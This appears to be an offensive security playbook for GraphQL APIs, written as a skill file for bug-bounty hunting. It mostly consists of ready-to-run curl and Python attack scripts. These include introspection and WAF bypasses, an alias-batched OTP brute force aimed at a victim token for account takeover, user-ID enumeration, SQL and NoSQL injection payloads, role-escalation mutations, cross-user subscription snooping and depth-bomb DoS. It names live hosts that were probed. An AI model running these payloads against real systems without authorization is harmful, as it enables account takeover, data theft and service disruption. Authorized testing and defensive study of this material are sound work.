---
name: graphql-audit
description: GraphQL security hunting — introspection abuse, field suggestion leaks, resolver-level authz/IDOR, batching and rate-limit issues, CSRF on GET mutations, and how to keep testing when introspection is disabled.
---

# GraphQL security hunting

When introspection is disabled ("GraphQL introspection is not allowed by Apollo Server") you
are NOT blind. Two oracles replace it:

> **Persisted-query-only endpoints** (the app rejects *all* arbitrary operations with
> `"Arbitrary operations not available to untrusted clients"` and only answers allowlisted
> `preRegisteredQueryId` queries) get their own recipe — harvesting the ids from the app's own
> traffic and mining the variables for BOLA — in
> `references/persisted-query-only-apis.md` — which also covers the **path-encoded APQ** variant (`/<Operation>/<sha256>` in the URL, GET) and how to harvest the real call shape from Wayback/waymore when the live base path 404s. The §1–§3 oracles below do NOT apply to those.

## 1. Field-suggestion oracle ("Did you mean") — full technique in §3 below

Apollo's validator suggests near-miss names:
`Cannot query field "totallPriceX" on type "Cart". Did you mean "totalPrice"?`
So a deliberately wrong field name per prefix harvests REAL field names, one or several per
request. Practical loop:

    for probe in ("getOr", "getP", "getS", "getC", "getN", "getA", "pagesX", "addr", "card",
                  "meX", "searchX", "vou", "loy", "one", ...):
        query { <probe> { __typename } }        # read the "Did you mean" list

Then CONFIRM each candidate (`query { <name> { __typename } }`) and classify the response:
`Cannot query field` → not real; `must not have a selection since type "Boolean!"` → scalar;
`Field "x" argument "y" of type "Z!" is required` → exists, note the argument signature;
`200 + data` → callable unauthenticated.

Notes: suggestions are edit-distance based, so use probes that are 1–3 characters off a
plausible name; a totally unrelated name yields no suggestion at all. The same trick maps
object types too (`me { activeCart { totallPriceX } }` → `totalPrice`).

## 2. Error-shape oracle

Distinct messages disclose a lot without introspection:
- `"orderId is a required field | email is a required field"` → resolver-level validation,
  reveals required params and which service backs the field (`serviceName: "orders"`).
- `"Hash must be exactly 64 characters"` → token format, before any DB hit.
- `"... de.hybris.platform...dto.voucher.VoucherWsDTO au.com.target.tgtcommerceocc.v2.
  controllers.ExtendedVouchersController.createSerialVoucherCodes(...)"` → verbose validation
  leaks internal packages/controllers (info disclosure in its own right) AND shows the
  endpoint validates args BEFORE checking auth. When the endpoint is a WRITE that creates
  business records (vouchers, orders), do not "verify" it with valid arguments — that creates
  real data. Document the lead and ask the program/operator instead.
- `400 {"message":"This operation has been blocked as a potential Cross-Site Request
  Forgery"}` = Apollo CSRF protection on simple GETs: send `content-type: application/json`
  or `apollo-require-preflight: true` and the query goes through — useful when POST is
  WAF-blocked but GET is not.

### 2b. Structured-extensions oracle (Graphene-style engines, NO suggestions, NO introspection)

Some engines (Graphene behind Rails, seen live on app.coderpad.io/graphql) block `__schema`
with `{"errors":[{"message":"Field '__schema' doesn't exist on type 'Query'","extensions":{"code":"undefinedField",...}}]}`
and emit **no "Did you mean" suggestions** — the §1 oracle is dead. The `extensions.code`
taxonomy still enumerates the schema one probe per question, all over HTTP 200:

| Probe | Response `extensions` | What it proves |
|---|---|---|
| `query { <name> }` | `undefinedField` (+typeName/fieldName) | field does NOT exist (namespaces the result per type) |
| `query { <name> }` | `selectionRequired` + message *"field 'x' returns **User** but has no selections"* | field EXISTS **and reveals its return type name** |
| `query { f(wrongArg: 1) }` | `argumentNotAccepted` (+name/typeName/fieldName) | field exists; argument does not — sweep arg names |
| `query Q($id: ID!){ f(id:$id) }` | `variableMismatch` + *"(ID! / **Int!**)"* | **reveals the argument's real type** (`Int!` here) |
| `query { f(...) { id } }` | `NotLoggedInError` in `errors[]` **with** `data:{"f":null}`, HTTP **200** | field exists, is auth-gated (200+errors, not 403 — do not misread as reachable) |

Loop: candidate-name sweep (existence) → `{ name { id } }` (return type) → wrong-arg sweep
(arg names) → `variableMismatch` (arg types) → real call (authz verdict). Verified mapping run:
user, organization, inviteDetails, emailDomain, question(id:Int!), snippet, quota, plan, plans —
~25 requests, zero auth. Note the differential vs §1: suggestion engines answer per-*type*,
extensions engines answer per-*field+extensions code*; record which oracle you used in the report.

### 2c. Before reporting GraphQL CSRF / DoS — three differentials that decide impact (coderpad 2026-10-17)

Real behaviors that still failed the impact bar, with the tests that killed them:

1. **Content-type matrix, not one probe.** `application/x-www-form-urlencoded` executing is only a
   CSRF *prerequisite*. Run the full matrix before claiming anything:
   `application/json` ✓ · `application/x-www-form-urlencoded` ✓ · `text/plain` (form
   `enctype="text/plain"`) → *"No query string was present"* ✗ · no Content-Type ✗ · GET → 302 ✗ ·
   JSON array batch → *"No query string was present"* ✗. If only urlencoded works, the no-preflight
   form vector still needs a cookie-authenticated target.
2. **Cookie-auth differential — the decisive CSRF test.** Send authenticated-field queries
   (`{ user { id } }`, `{ organization { id } }`, …) *with the app's own session cookie* in the
   request. If every field answers `NotLoggedInError`, auth is Bearer-token only → a cross-site
   page cannot set that header → **CSRF impact is none**, full stop. Conversely, CORS probe
   (`Origin: https://evil.example.com` → no `Access-Control-Allow-Origin` reflection) closes the
   read-side. Record both negatives in the report.
3. **Measure amplification before calling it DoS.** Alias overloading (no alias-count limit) is
   only reportable if per-request cost actually scales: time 1 / 25 / 100 / 400 aliases of the
   cheapest unauthenticated field. Measured on app.coderpad.io: 0.927s → 1.038s (400 aliases,
   +0.11s) — negligible; the field was cheap and batching was rejected. If the curve is flat, the
   finding is "no limit exists" (informational) unless an expensive field is reachable.

Bonus: a **sibling endpoint that does it right** is strong supporting evidence
(escape.codingame.com/graphql answered urlencoded with `415 Unsupported Media Type` while
app.coderpad.io executed it — an internal inconsistency worth quoting), but it does not substitute
for the impact tests above.

## 3. Transport when the edge fights you

If POSTs to the GraphQL path get Akamai `429 {"cpr_chlge":"true"}` while the app's own XHR
works, try (a) `content-type: application/json;charset=UTF-8`, (b) switching to GET with the
document URL-encoded plus a non-simple header. Both are covered in
`bot-protected-target-testing`. Drive everything from inside the real page (XHR, not curl) so
the sensor cookies apply; containerise each request with an in-page timeout so a hanging
resolver cannot wedge your driver.

## 4. What to test once you can call queries

- Unauthenticated root fields that touch per-user data (`getOrder(email, orderId)`,
  `getXByHash(hash)`): check for an existence oracle (different error for "not found" vs
  "denied"), token format, and whether the token is guessable/deterministic.
- Mutations with no arguments, or whose validation runs before auth.
- Object-ID swaps on cart/order/address children (BOLA): expect `404/401` scoped to `/me`
  on well-built APIs — record the negative.
- Server-side validation of numeric fields (negative/zero quantity, price overrides) and
  custom-field allowlists (`setCustomField` with a client-chosen name).


# GRAPHQL SECURITY AUDIT

> GraphQL flips the threat model — clients drive queries. One endpoint, infinite attack surface. Introspection hands you the schema; even without it, field suggestions give you 80% back.

---

## 0. QUICK KILL CHECKLIST

```
[ ] Run graphql_audit.sh <endpoint> — full automated sweep
[ ] Check if introspection is enabled (__schema query)
[ ] If introspection off — run clairvoyance for field discovery
[ ] Fingerprint engine (graphw00f) — different engines, different CVEs
[ ] Test query batching — send 100 identical queries in one POST
[ ] Test alias bombing — 1000 aliases in one query
[ ] Check field suggestions on typos — leaks schema even when introspection off
[ ] Try IDOR: query another user's object by ID, no auth check
[ ] Test field-level auth: query privileged fields (admin, role, internalNote)
[ ] Inject SQLi/NoSQLi via string arguments — id, filter, search args
[ ] Check subscriptions: can you subscribe to other users' events?
[ ] Try introspection bypass: __schema\nquery, query batching, fragment tricks
[ ] Look for mutation rate limiting — account takeover / self-XSS via mutations
```

---

## 1. TOOL — graphql_audit.sh

```bash
# Basic audit
bash tools/graphql_audit.sh https://target.com/graphql

# With auth cookie
bash tools/graphql_audit.sh https://target.com/api/graphql --cookie "session=abc123"

# With Authorization header
bash tools/graphql_audit.sh https://target.com/graphql --header "Authorization: Bearer TOKEN"

# Through Burp proxy
bash tools/graphql_audit.sh https://target.com/graphql --proxy http://127.0.0.1:8080

# Custom output directory
bash tools/graphql_audit.sh https://target.com/graphql --output-dir ./findings/target/graphql
```

**Output:** `findings/<target>/graphql/<timestamp>/`
- `introspection.json` — full schema dump (if enabled)
- `fingerprint.txt` — engine type (graphw00f)
- `field_suggestions.txt` — discovered fields via clairvoyance
- `batching_dos.txt` — response time delta for 1 vs 100 queries
- `alias_bomb.txt` — alias depth test results
- `gqlmap.txt` — injection scan results
- `cop_report.txt` — graphql-cop attack checklist results
- `summary.txt` — hit/miss per phase

---

## 2. INTROSPECTION — Schema Leak (Most Common First Step)

### Check If Enabled

```bash
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { name } } }"}' | jq .
```

### Full Schema Dump

```bash
# Pull complete introspection schema (pipe to InQL or graphql-voyager)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
  }' | jq . > schema.json
```

### What To Look For In The Schema

```
- Mutations involving user data: updateUser, deleteAccount, changeEmail, changePassword
- Queries returning other users' objects: user(id: X), order(id: X)
- Fields: internalNote, adminOnly, role, isAdmin, rawPassword, apiKey
- Types: AdminUser, InternalConfig, DebugInfo
- Deprecated fields — often bypassed auth or forgotten
- Subscription types — real-time data leaks
```

### Introspection Bypass Techniques

When `__schema` is blocked, try:
```bash
# Newline injection (bypasses naive keyword filters)
{"query": "query {\n  __schema\n  { queryType { name } } }"}

# Fragment trick
{"query": "fragment f on __Schema { queryType { name } } { ...f }"}

# __type instead of __schema (often overlooked in blocklists)
{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}

# Via GET request (some servers allow GET, filter only POST)
GET /graphql?query={__schema{queryType{name}}}

# Over WebSocket (GraphQL subscriptions)
# Different code path — introspection may be unrestricted
```

---

## 3. FIELD SUGGESTION ABUSE (Introspection Off — Still Works)

GraphQL engines return helpful "Did you mean X?" errors on typos. This leaks field names.

### Manual Probe

```bash
# Typo on a known field to trigger suggestions
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}' | grep -i "suggest\|did you mean\|Cannot query"
```

### Clairvoyance (Automated — Recommended)

```bash
# Install
pip install clairvoyance

# Run field discovery against a known type
clairvoyance -u https://target.com/graphql -o schema.json

# With auth
clairvoyance -u https://target.com/graphql \
  -H "Authorization: Bearer TOKEN" \
  -o schema.json

# Seed with known type names (speeds up discovery significantly)
clairvoyance -u https://target.com/graphql \
  --input-document schema_partial.json \
  -o schema_full.json
```

**What clairvoyance recovers:** type names, field names, argument names — ~80% of introspection output even when blocked.

---

## 4. BATCHING DoS (High Payout, Easy to Prove)

GraphQL allows sending multiple operations in one POST. No rate limit = DoS or brute-force amplifier.

### Array Batching (Most Common)

```bash
# 100 queries in one request — measure response time delta
python3 -c "
import json, sys
q = {'query': '{ __typename }'}
print(json.dumps([q] * 100))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'
```

### Alias Batching (Bypasses per-query limits)

```bash
# 500 aliases — each alias is a separate resolver call
python3 -c "
aliases = ' '.join(f'q{i}: __typename' for i in range(500))
print('{\"query\": \"{ ' + aliases + ' }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

### Impact Escalation

- **Brute force amplifier:** 100 login mutations per HTTP request → bypasses per-IP lockout
- **OTP bypass:** 1000 alias queries testing OTP codes in one request
- **Password reset bombing:** 100 resetPassword mutations, each with a different email

```bash
# OTP brute force via alias batching — chain with account takeover
python3 -c "
import json
mutations = []
for code in range(1000, 2000):
    mutations.append(f'v{code}: verifyOTP(code: \"{code}\", token: \"VICTIM_TOKEN\") {{ success }}')
query = '{ ' + ' '.join(mutations) + ' }'
print(json.dumps({'query': query}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 5. IDOR VIA DIRECT OBJECT ACCESS

GraphQL queries often accept IDs directly. Test whether the server enforces ownership.

### Basic IDOR Probe

```bash
# Logged in as user A (id=1) — query user B's data
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ user(id: 2) { email phone address paymentMethods { last4 } } }"}'

# Try orders, messages, invoices, appointments
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=USER_A_COOKIE' \
  -d '{"query":"{ order(id: 999) { total items { name } user { email } } }"}'
```

### Field-Level IDOR (Privileged Fields on Accessible Objects)

```bash
# Object is yours — but are ALL fields yours to read?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { id email role isAdmin internalNote rawApiKey } }"}'

# Test privileged mutations on other users
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateUser(id: 2, role: \"admin\") { success } }"}'
```

### Enumeration via Aliases

```bash
# Enumerate 50 user IDs in one request
python3 -c "
import json
aliases = [f'u{i}: user(id: {i}) {{ id email role }}' for i in range(1, 51)]
print(json.dumps({'query': '{ ' + ' '.join(aliases) + ' }'}))
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @-
```

---

## 6. INJECTION VIA ARGUMENTS

GraphQL arguments pass directly to resolvers. Resolvers often pass them to SQL/NoSQL queries without sanitization.

### SQL Injection

```bash
# Classic SQLi probe via search/filter args
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(search: \"admin'\''--\") { id email } }"}'

# Time-based blind SQLi
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(id: \"1 AND SLEEP(5)--\") { email } }"}'

# gqlmap for automated injection
gqlmap --target https://target.com/graphql \
  --query '{ users(search: GQLMAP) { id email } }' \
  --dbms mysql
```

### NoSQL Injection (MongoDB common in GraphQL backends)

```bash
# MongoDB operator injection via JSON coercion
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ login(username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}) { token } }"}'

# Regex bypass
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ users(filter: {email: {\"$regex\": \".*\"}}) { id email } }"}'
```

### SSTI via Template-Rendered Fields

```bash
# If description/bio fields render in templates
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { updateProfile(bio: \"{{7*7}}\") { bio } }"}'
```

---

## 7. AUTHORIZATION BYPASS PATTERNS

### Unauthenticated Queries

```bash
# Try sensitive queries without any auth token
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ users { id email role } }"}'

# Try mutations without auth
curl -s -X POST https://target.com/graphql \
  -d '{"query":"mutation { createAdmin(email: \"test@example.com\", password: \"pass\") { id } }"}'
```

### Horizontal → Vertical Privilege Escalation

```bash
# Step 1: Find role mutation in schema
# Step 2: Call it as a regular user
curl -s -X POST https://target.com/graphql \
  -H 'Cookie: session=NORMAL_USER' \
  -d '{"query":"mutation { updateUserRole(userId: ME_ID, role: \"ADMIN\") { success } }"}'
```

### Deprecated Field Auth Bypass

```bash
# Deprecated fields are often forgotten — auth checks removed or loosened
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ userProfile(id: 2) { legacyToken adminFlags } }"}'
```

---

## 8. SUBSCRIPTION ABUSE

WebSocket-based subscriptions can leak cross-user events if not scoped per-user.

```bash
# Subscribe to another user's events (Burp WebSocket tab or wscat)
# First: capture legitimate subscription query in Burp
# Then: change userId to victim's ID

wscat -c wss://target.com/graphql \
  -s 'graphql-ws' \
  --execute '{"type":"start","id":"1","payload":{"query":"subscription { orderUpdated(userId: VICTIM_ID) { status total } }"}}'

# Check if subscription delivers events for ALL users (no scoping)
# Critical if: payment status, message content, location updates
```

---

## 9. DEPTH / COMPLEXITY BOMBS

No query depth/complexity limits = DoS.

```bash
# Circular reference bomb (if schema has circular types)
# e.g. User -> friends -> User -> friends -> ...
python3 -c "
depth = 20
inner = 'id email'
for _ in range(depth):
    inner = f'friends {{ id {inner} }}'
print('{\"query\": \"{ me { ' + inner + ' } }\"}')
" | curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/json' \
  -d @- -w '\nTime: %{time_total}s\n'

# If response time grows linearly — report as DoS
```

---

## 10. FINGERPRINTING & CVE HUNTING (graphw00f)

Different GraphQL engines have different CVEs. Fingerprint first.

```bash
# Install
pip install graphw00f

# Fingerprint
python3 -m graphw00f.main -d -t https://target.com/graphql

# Common engines and their known issues:
# Hasura       — auth bypass, remote schema injection
# Apollo       — query depth issues in old versions
# GraphQL-Go   — various older CVEs
# Graphene     — Python injection risk in custom resolvers
# Hot Chocolate — .NET, watch for SSRF in federation
# WPGraphQL    — WordPress + GraphQL = lots of IDOR
```

---

## 11. graphql-cop — Automated Attack Checklist

```bash
# Install
pip install graphql-cop

# Run all checks
graphql-cop -t https://target.com/graphql

# With auth
graphql-cop -t https://target.com/graphql \
  -H "Authorization: Bearer TOKEN"

# Checks performed:
# - Introspection enabled
# - Field suggestions enabled
# - GET method supported
# - Query batching enabled
# - Alias overloading
# - Directive overloading
# - Deep recursion allowed
# - Character limit missing
# - Mutation introspection
```

---

## 12. WAF BYPASS FOR GRAPHQL

```bash
# Content-type switching (some WAFs only filter application/json)
curl -s -X POST https://target.com/graphql \
  -H 'Content-Type: application/graphql' \
  -d '{ __schema { queryType { name } } }'

# GET introspection (WAF may only block POST)
curl -s "https://target.com/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Comment injection to break keyword matching
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ __sch#comment\nema { queryType { name } } }"}'

# Fragment-based introspection
curl -s -X POST https://target.com/graphql \
  -d '{"query":"fragment s on __Schema { queryType { name } } query { ...s }"}'
```

---

## 13. CHAINING FINDINGS

| Chain | Severity |
|---|---|
| Introspection → find admin mutations → call without auth | Critical |
| Batching → OTP brute force → account takeover | Critical |
| Field suggestions → discover hidden field → IDOR | High |
| Alias bomb → bypass rate limit → credential stuffing | High |
| Unauthenticated subscription → real-time PII leak | High |
| Depth bomb → no query limits → DoS | Medium |
| Deprecated field → PII exposure | Medium |

---

## 14. REPORT TEMPLATE

```
Title: GraphQL [VULN TYPE] — [Impact One-liner]

Example titles:
- "GraphQL Introspection Enabled — Full Schema Disclosure on api.target.com"
- "GraphQL Batching Allows OTP Brute Force — Account Takeover via Alias Bombing"
- "GraphQL IDOR via Direct Object Queries — Access Any User's Private Data"

Endpoint: POST https://target.com/graphql

Request:
[paste raw curl or HTTP request]

Response:
[paste relevant portion of response]

Impact:
[what an attacker can actually do RIGHT NOW — no hypotheticals]

Steps to Reproduce:
1. [exact curl or Burp Repeater step]
2. [observe the response]
3. [confirm impact]

CVSS (approximate):
- Introspection only: CVSS 5.3 (Medium) — info disclosure
- IDOR cross-user: CVSS 7.5-8.5 (High)
- Batching ATO chain: CVSS 9.0+ (Critical)
- Unauthenticated mutation: CVSS 9.8 (Critical)

Remediation:
- Disable introspection in production (allow only in dev environments)
- Enforce per-query depth limit (recommend <= 10)
- Enforce complexity limits
- Disable query batching or add per-batch rate limits
- Validate object ownership in every resolver (not just at route level)
- Remove field suggestions in production
```

---

## KILL SIGNALS — Walk Away

```
- Endpoint returns 404/410 consistently — not active
- All queries return generic "Unauthorized" with no suggestions — well-hardened
- Rate limit fires on query 2 — strong protection, low ROI
- Only __typename accessible, no types — schema fully locked down
- Engine is Apollo Federation gateway only — attack the downstream services instead
```

---

## TOOLS REFERENCE

| Tool | Purpose | Install |
|---|---|---|
| `graphql_audit.sh` | Automated multi-phase sweep | this repo |
| `graphw00f` | Engine fingerprinting | `pip install graphw00f` |
| `clairvoyance` | Field discovery (no introspection) | `pip install clairvoyance` |
| `graphql-cop` | Attack checklist runner | `pip install graphql-cop` |
| `gqlmap` | SQL/NoSQL injection scanner | `pip install gqlmap` |
| `inql` | Burp Suite extension — schema + IDOR | Burp BApp Store |
| `graphql-voyager` | Visual schema explorer | browser tool |
| `wscat` | WebSocket subscription testing | `npm i -g wscat` |


## 2026 sweep 3 (dork pass 2026-10-18 — web2, 1 repo)

- GraphQL Pentest Checklist 2026 (13 technique lines) — current checklist for introspection, batching, alias-based rate-limit abuse and field-level authz testing.
  - [ ] Test all queries/mutations **unauthenticated** — check for missing `@auth` directives
  - [ ] Test token reuse across tenants (horizontal privilege escalation)


## 2026 sweep 6 (dork pass 2026-10-18 — 2 repo)

- CVE-2026-11103 — **GraphQL batching + alias rate-limit bypass**: aliases let one HTTP request carry many operations, defeating per-request rate limits. Lesson: rate limits counted per HTTP request are meaningless on GraphQL — count resolved fields or operations server-side.
  - 3. CVE-2026-11103 – GraphQL Batching Alias Rate Limit Bypass
- GraphQL Pentest Checklist 2026 — actionable items: test **all queries/mutations unauthenticated** (missing `@auth` directives), test **token reuse across tenants** (horizontal privilege escalation), and check whether **subscription connections bypass auth** (WebSocket handshake auth vs per-message auth) — including whether unauthenticated users can trigger or listen to subscriptions.
